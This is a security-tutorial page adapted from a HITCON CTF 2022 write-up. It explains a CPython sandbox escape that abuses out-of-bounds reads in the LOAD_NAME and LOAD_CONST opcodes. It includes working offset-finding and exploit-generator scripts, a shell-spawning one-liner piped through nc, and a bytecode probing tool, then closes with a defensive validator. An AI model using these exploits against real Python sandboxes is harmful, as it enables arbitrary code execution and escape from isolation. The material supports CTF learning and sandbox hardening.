# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**This info was taken** [**from this writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

We can use OOB read feature in LOAD_NAME / LOAD_CONST opcode to get some symbol in the memory. Which means using trick like `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` to get a symbol (such as function name) you want.

Then just craft your exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

The source code is pretty short, only contains 4 lines!

```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```

You can input arbitrary Python code, and it'll be compiled to a [Python code object](https://docs.python.org/3/c-api/code.html). However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.

So in this way, all the expression contains consts (e.g. numbers, strings etc.) or names (e.g. variables, functions) might cause segmentation fault in the end.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

How does the segfault happen?

Let's start with a simple example, `[a, b, c]` could compile into the following bytecode.

```
  1           0 LOAD_NAME                0 (a)
              2 LOAD_NAME                1 (b)
              4 LOAD_NAME                2 (c)
              6 BUILD_LIST               3
              8 RETURN_VALUE12345
```

But what if the `co_names` become empty tuple? The `LOAD_NAME 2` opcode is still executed, and try to read value from that memory address it originally should be. Yes, this is an out-of-bound read "feature".

The core concept for the solution is simple. Some opcodes in CPython for example `LOAD_NAME` and `LOAD_CONST` are vulnerable (?) to OOB read.

They retrieve an object from index `oparg` from the `consts` or `names` tuple (that's what `co_consts` and `co_names` named under the hood). We can refer to the following short snippest about `LOAD_CONST` to see what CPython does when it proccesses to `LOAD_CONST` opcode.

```c
case TARGET(LOAD_CONST): {
    PREDICTED(LOAD_CONST);
    PyObject *value = GETITEM(consts, oparg);
    Py_INCREF(value);
    PUSH(value);
    FAST_DISPATCH();
}1234567
```

In this way we can use the OOB feature to get a "name" from arbitrary memory offset. To make sure what name it has and what's it's offset, just keep trying `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... And you could find something in about oparg > 700. You can also try to use gdb to take a look at the memory layout of course, but I don't think it would be more easier?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Once we retrieve those useful offsets for names / consts, how _do_ we get a name / const from that offset and use it? Here is a trick for you:\
Let's assume we can get a `__getattribute__` name from offset 5 (`LOAD_NAME 5`) with `co_names=()`, then just do the following stuff:

```python
[a,b,c,d,e,__getattribute__] if [] else [
    [].__getattribute__
    # you can get the __getattribute__ method of list object now!
]1234
```

> Notice that it is not necessary to name it as `__getattribute__`, you can name it as something shorter or more weird

You can understand the reason behind by just viewing it's bytecode:

```python
              0 BUILD_LIST               0
              2 POP_JUMP_IF_FALSE       20
        >>    4 LOAD_NAME                0 (a)
        >>    6 LOAD_NAME                1 (b)
        >>    8 LOAD_NAME                2 (c)
        >>   10 LOAD_NAME                3 (d)
        >>   12 LOAD_NAME                4 (e)
        >>   14 LOAD_NAME                5 (__getattribute__)
             16 BUILD_LIST               6
             18 RETURN_VALUE
             20 BUILD_LIST               0
        >>   22 LOAD_ATTR                5 (__getattribute__)
             24 BUILD_LIST               1
             26 RETURN_VALUE1234567891011121314
```

Notice that `LOAD_ATTR` also retrieve the name from `co_names`. Python loads names from the same offset if the name is the same, so the second `__getattribute__` is still loaded from offset=5. Using this feature we can use arbitrary name once the name is in the memory nearby.

For generating numbers should be trivial:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

I didn't use consts due to the length limit.

First here is a script for us to find those offsets of names.

```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
    def __getitem__(self, k):
        if type(k) == str:
            return k


if __name__ == '__main__':
    n = int(argv[1])

    code = [
        *([opmap['EXTENDED_ARG'], n // 256]
          if n // 256 != 0 else []),
        opmap['LOAD_NAME'], n % 256,
        opmap['RETURN_VALUE'], 0
    ]

    c = CodeType(
        0, 0, 0, 0, 0, 0,
        bytes(code),
        (), (), (), '<sandbox>', '<eval>', 0, b'', ()
    )

    ret = eval(c, {'__builtins__': MockBuiltins()})
    if ret:
        print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```

And the following is for generating the real Python exploit.

```python
import sys
import unicodedata


class Generator:
    # get numner
    def __call__(self, num):
        if num == 0:
            return '(not[[]])'
        return '(' + ('(not[])+' * num)[:-1] + ')'

    # get string
    def __getattribute__(self, name):
        try:
            offset = None.__dir__().index(name)
            return f'keys[{self(offset)}]'
        except ValueError:
            offset = None.__class__.__dir__(None.__class__).index(name)
            return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
    while True:
        chr_code += 1
        char = unicodedata.normalize('NFKC', chr(chr_code))
        if char.isidentifier() and char not in names:
            names.append(char)
            break

offsets = {
    "__delitem__": 2800,
    "__getattribute__": 2850,
    '__dir__': 4693,
    '__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
             'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
    names[offset] = name

for i, var in enumerate(variables):
    assert var not in offsets
    names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
    get(get([],{_.__class__}),{_.__base__}),
    {_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
    builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```

It basically does the following things, for those strings we get it from the `__dir__` method:

```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
  getattr(
    getattr(
      [].__getattribute__('__class__'),
    '__base__'),
  '__subclasses__'
  )()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```

---

### Version notes and affected opcodes (Python 3.11–3.13)

- CPython bytecode opcodes still index into `co_consts` and `co_names` tuples by integer operands. If an attacker can force these tuples to be empty (or smaller than the maximum index used by the bytecode), the interpreter will read out-of-bounds memory for that index, yielding an arbitrary PyObject pointer from nearby memory. Relevant opcodes include at least:
  - `LOAD_CONST consti` → reads `co_consts[consti]`.
  - `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → read names from `co_names[...]` (for 3.11+ note `LOAD_ATTR`/`LOAD_GLOBAL` store flag bits in the low bit; the actual index is `namei >> 1`). See the disassembler docs for exact semantics per version. [Python dis docs].
- Python 3.11+ introduced adaptive/inline caches that add hidden `CACHE` entries between instructions. This doesn’t change the OOB primitive; it only means that if you handcraft bytecode, you must account for those cache entries when building `co_code`.

Practical implication: the technique in this page continues to work on CPython 3.11, 3.12 and 3.13 when you can control a code object (e.g., via `CodeType.replace(...)`) and shrink `co_consts`/`co_names`.

### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)

If you prefer to probe for interesting objects directly from bytecode rather than from high-level source, you can generate minimal code objects and brute force indices. The helper below automatically inserts inline caches when needed.

```python
import dis, types

def assemble(ops):
    # ops: list of (opname, arg) pairs
    cache = bytes([dis.opmap.get("CACHE", 0), 0])
    out = bytearray()
    for op, arg in ops:
        opc = dis.opmap[op]
        out += bytes([opc, arg])
        # Python >=3.11 inserts per-opcode inline cache entries
        ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
        out += cache * ncache
    return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
    code = assemble([
        ("RESUME", 0),          # 3.11+
        ("LOAD_CONST", i),
        ("RETURN_VALUE", 0),
    ])
    c = base.replace(co_code=code, co_consts=(), co_names=())
    try:
        return eval(c)
    except Exception:
        return None

for idx in range(0, 300):
    obj = probe_const(idx)
    if obj is not None:
        print(idx, type(obj), repr(obj)[:80])
```

Notes
- To probe names instead, swap `LOAD_CONST` for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust your stack usage accordingly.
- Use `EXTENDED_ARG` or multiple bytes of `arg` to reach indexes >255 if needed. When building with `dis` as above, you only control the low byte; for larger indexes, construct the raw bytes yourself or split the attack across multiple loads.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Once you have identified a `co_consts` index that resolves to the builtins module, you can reconstruct `eval(input())` without any `co_names` by manipulating the stack:

```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```

This approach is useful in challenges that give you direct control over `co_code` while forcing `co_consts=()` and `co_names=()` (e.g., BCTF 2024 “awpcode”). It avoids source-level tricks and keeps payload size small by leveraging bytecode stack ops and tuple builders.

### Defensive checks and mitigations for sandboxes

If you are writing a Python “sandbox” that compiles/evaluates untrusted code or manipulates code objects, do not rely on CPython to bounds-check tuple indexes used by bytecode. Instead, validate code objects yourself before executing them.

Practical validator (rejects OOB access to co_consts/co_names)

```python
import dis

def max_name_index(code):
    max_idx = -1
    for ins in dis.get_instructions(code):
        if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
                          "IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
            namei = ins.arg or 0
            # 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
            if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
                namei >>= 1
            max_idx = max(max_idx, namei)
    return max_idx

def max_const_index(code):
    return max([ins.arg for ins in dis.get_instructions(code)
                if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
    if max_const_index(code) >= len(code.co_consts):
        raise ValueError("Bytecode refers to const index beyond co_consts length")
    if max_name_index(code) >= len(code.co_names):
        raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```

Additional mitigation ideas
- Don’t allow arbitrary `CodeType.replace(...)` on untrusted input, or add strict structural checks on the resulting code object.
- Consider running untrusted code in a separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.



## References

- Splitline’s HITCON CTF 2022 writeup “V O I D” (origin of this technique and high-level exploit chain): https://blog.splitline.tw/hitcon-ctf-2022/
- Python disassembler docs (indices semantics for LOAD_CONST/LOAD_NAME/etc., and 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
